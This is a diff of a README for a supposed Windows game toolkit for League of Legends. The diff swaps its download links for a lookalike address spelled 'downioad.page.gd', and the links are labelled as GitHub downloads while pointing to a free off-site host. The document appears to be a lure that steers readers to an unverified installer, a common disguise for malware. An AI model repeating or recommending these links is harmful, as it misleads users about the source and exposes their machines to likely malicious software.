@@ -2,7 +2,7 @@
 
 League of Legends Auto Toolkit 2026 is a comprehensive Windows desktop suite designed to enhance your gaming experience. It provides a centralized hub for managing visual updates, performance settings, and gameplay adjustments, offering a more personalized and streamlined interface for Summoner's Rift.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -48,4 +48,4 @@ A: The toolkit requires an existing, official installation of the League of Lege
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
